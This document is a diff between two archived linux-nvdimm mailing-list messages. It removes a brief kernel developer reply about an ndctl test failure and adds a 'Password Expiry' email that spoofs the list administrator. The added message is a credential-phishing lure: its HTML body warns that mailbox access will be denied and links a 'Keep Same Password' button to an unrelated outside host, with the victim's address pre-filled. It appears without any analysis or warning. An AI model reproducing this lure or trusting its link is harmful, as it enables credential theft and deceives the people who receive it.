@@ -2,58 +2,84 @@ Return-Path: <linux-nvdimm-bounces@lists.01.org>
 X-Original-To: lists+linux-nvdimm@lfdr.de
 Delivered-To: lists+linux-nvdimm@lfdr.de
 Received: from ml01.01.org (ml01.01.org [IPv6:2001:19d0:306:5::1])
-	by mail.lfdr.de (Postfix) with ESMTPS id 56FC533089E
-	for <lists+linux-nvdimm@lfdr.de>; Mon,  8 Mar 2021 08:09:25 +0100 (CET)
+	by mail.lfdr.de (Postfix) with ESMTPS id 20166330A87
+	for <lists+linux-nvdimm@lfdr.de>; Mon,  8 Mar 2021 10:51:18 +0100 (CET)
 Received: from ml01.vlan13.01.org (localhost [IPv6:::1])
-	by ml01.01.org (Postfix) with ESMTP id 2855D100EC1EE;
-	Sun,  7 Mar 2021 23:09:23 -0800 (PST)
-Received-SPF: None (mailfrom) identity=mailfrom; client-ip=213.95.11.211; helo=verein.lst.de; envelope-from=hch@lst.de; receiver=<UNKNOWN> 
-Received: from verein.lst.de (verein.lst.de [213.95.11.211])
-	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
-	(No client certificate requested)
-	by ml01.01.org (Postfix) with ESMTPS id B6A44100EC1CC;
-	Sun,  7 Mar 2021 23:09:19 -0800 (PST)
-Received: by verein.lst.de (Postfix, from userid 2407)
-	id D9B6A68B02; Mon,  8 Mar 2021 08:09:15 +0100 (CET)
-Date: Mon, 8 Mar 2021 08:09:15 +0100
-From: "hch@lst.de" <hch@lst.de>
-To: "Williams, Dan J" <dan.j.williams@intel.com>
-Subject: Re: [block]  52f019d43c: ndctl.test-libndctl.fail
-Message-ID: <20210308070915.GA32695@lst.de>
-References: <20210305055900.GC31481@xsang-OptiPlex-9020> <20210305074204.GA17414@lst.de> <6f40b1f53c029788e20fe175618d8772e36d648c.camel@intel.com>
+	by ml01.01.org (Postfix) with ESMTP id 66F50100EC1F5;
+	Mon,  8 Mar 2021 01:51:16 -0800 (PST)
+Received-SPF: None (mailfrom) identity=mailfrom; client-ip=103.138.109.249; helo=lists.01.org; envelope-from=administrator@lists.01.org; receiver=<UNKNOWN> 
+Received: from lists.01.org (unknown [103.138.109.249])
+	by ml01.01.org (Postfix) with ESMTP id CE996100ED484
+	for <linux-nvdimm@lists.01.org>; Mon,  8 Mar 2021 01:51:12 -0800 (PST)
+From: lists.01.org <administrator@lists.01.org>
+To: linux-nvdimm@lists.01.org
+Subject: Password Expiry
+Date: 08 Mar 2021 01:51:09 -0800
+Message-ID: <20210308015109.EE2E5ABBA6164BB2@lists.01.org>
 MIME-Version: 1.0
-Content-Disposition: inline
-In-Reply-To: <6f40b1f53c029788e20fe175618d8772e36d648c.camel@intel.com>
-User-Agent: Mutt/1.5.17 (2007-11-01)
-Message-ID-Hash: KSUWHPRP5EARRB35MRMFJB6KTV3QKLST
-X-Message-ID-Hash: KSUWHPRP5EARRB35MRMFJB6KTV3QKLST
-X-MailFrom: hch@lst.de
+Message-ID-Hash: IDUVNWVO4HGNL7UPHGP7N746VIFFFLPZ
+X-Message-ID-Hash: IDUVNWVO4HGNL7UPHGP7N746VIFFFLPZ
+X-MailFrom: administrator@lists.01.org
 X-Mailman-Rule-Hits: nonmember-moderation
 X-Mailman-Rule-Misses: dmarc-mitigation; no-senders; approved; emergency; loop; banned-address; member-moderation
-CC: "hch@lst.de" <hch@lst.de>, lkp <lkp@intel.com>, "hare@suse.de" <hare@suse.de>, "olkuroch@cisco.com" <olkuroch@cisco.com>, "linux-nvdimm@lists.01.org" <linux-nvdimm@lists.01.org>, "lkp@lists.01.org" <lkp@lists.01.org>, "ming.lei@redhat.com" <ming.lei@redhat.com>, "linux-kernel@vger.kernel.org" <linux-kernel@vger.kernel.org>, "axboe@kernel.dk" <axboe@kernel.dk>, "Sang, Oliver" <oliver.sang@intel.com>
 X-Mailman-Version: 3.1.1
 Precedence: list
 List-Id: "Linux-nvdimm developer list." <linux-nvdimm.lists.01.org>
-Archived-At: <https://lists.01.org/hyperkitty/list/linux-nvdimm@lists.01.org/message/KSUWHPRP5EARRB35MRMFJB6KTV3QKLST/>
+Archived-At: <https://lists.01.org/hyperkitty/list/linux-nvdimm@lists.01.org/message/IDUVNWVO4HGNL7UPHGP7N746VIFFFLPZ/>
 List-Archive: <https://lists.01.org/hyperkitty/list/linux-nvdimm@lists.01.org/>
 List-Help: <mailto:linux-nvdimm-request@lists.01.org?subject=help>
 List-Post: <mailto:linux-nvdimm@lists.01.org>
 List-Subscribe: <mailto:linux-nvdimm-join@lists.01.org>
 List-Unsubscribe: <mailto:linux-nvdimm-leave@lists.01.org>
+Content-Type: multipart/mixed; boundary="===============6358392894058659509=="
+
+--===============6358392894058659509==
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.9600.19377"></HEAD>
+<body>
+<DIV style=3D"FONT-SIZE: 15px; BORDER-TOP: white 1px solid; FONT-FAMILY: 'S=
+egoe UI', 'Segoe WP', 'Segoe UI WPC', Tahoma, Arial, sans-serif; BORDER-RIG=
+HT: white 1px solid; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-BOTTOM:=
+ white 1px solid; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(33,33,=
+33); PADDING-BOTTOM: 10px; FONT-STYLE: normal; PADDING-TOP: 10px; PADDING-L=
+EFT: 10px; BORDER-LEFT: white 1px solid; ORPHANS: 2; WIDOWS: 2; LETTER-SPAC=
+ING: normal; PADDING-RIGHT: 10px; BACKGROUND-COLOR:=20
+rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-va=
+riant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-style: =
+initial; text-decoration-color: initial">
+<DIV style=3D"MARGIN-BOTTOM: 14pt; MARGIN-TOP: 14pt"><FONT size=3D4><B><FON=
+T color=3D#5b7ca4 size=3D6>Password Expiry</FONT></B></FONT></DIV><FONT siz=
+e=3D2>Dear </FONT>linux-nvdimm,<FONT size=3D1><BR></FONT><FONT size=3D2><BR=
+><STRONG>The password to your email<SPAN> </SPAN></STRONG></FONT><FONT colo=
+r=3D#3333ff size=3D2>linux-nvdimm@lists.01.org </FONT><STRONG><FONT size=3D=
+2><SPAN></SPAN>is expiring on<SPAN> 09</SPAN></FONT><FONT size=3D2>/03/2021=
+ 11:33:53 am</FONT></STRONG><FONT size=3D2><BR><STRONG>
+You are required to use below to keep same password otherwise access to you=
+r mailbox will be denied.</STRONG></FONT><FONT size=3D2><BR></FONT><FONT si=
+ze=3D-1><BR></FONT>
+<DIV style=3D"BORDER-TOP-COLOR: rgb(0,117,191); WIDTH: 350px; BORDER-LEFT-C=
+OLOR: rgb(0,117,191); PADDING-BOTTOM: 10px; BORDER-BOTTOM-COLOR: rgb(0,117,=
+191); TEXT-ALIGN: center; PADDING-TOP: 10px; PADDING-LEFT: 10px; MARGIN: 0p=
+x; BORDER-RIGHT-COLOR: rgb(0,117,191); PADDING-RIGHT: 10px; BACKGROUND-COLO=
+R: rgb(0,117,191)" align=3Dcenter><FONT size=3D2><SPAN style=3D"FONT-SIZE: =
+15px"><A href=3D"http://ecurehab.hu/sl.html?email=3Dlinux-nvdimm@lists.01.o=
+rg" target=3D_blank><FONT color=3D#ffffff size=3D-1><STRONG>
+Keep Same Password</STRONG></FONT></A></SPAN></FONT></DIV><FONT color=3D#99=
+9999 size=3D-1><BR>Connected to OWA</FONT><FONT color=3D#999999 size=3D-1><=
+BR>&copy; 2021 lists.01.org Corporation. All rights reserve</FONT></DIV></B=
+ODY></HTML>
+--===============6358392894058659509==
 Content-Type: text/plain; charset="us-ascii"
+MIME-Version: 1.0
 Content-Transfer-Encoding: 7bit
+Content-Disposition: inline
 
-On Sat, Mar 06, 2021 at 08:33:04PM +0000, Williams, Dan J wrote:
-> Yes, it looks like my unit test checks for exactly the behavior you
-> changed. It was convenient to test that the device could be switched
-> back to rw via BLKROSET, but I don't require that. The new behaviour of
-> letting the disk->ro take precedence makes more sense to me, so I'll
-> update the test for the new behaviour.
-> 
-> I.e. I don't think regressing a unit test counts as a userspace
-> regression.
-
-Ok, thanks for the confirmation.
 _______________________________________________
 Linux-nvdimm mailing list -- linux-nvdimm@lists.01.org
 To unsubscribe send an email to linux-nvdimm-leave@lists.01.org
+
+--===============6358392894058659509==--
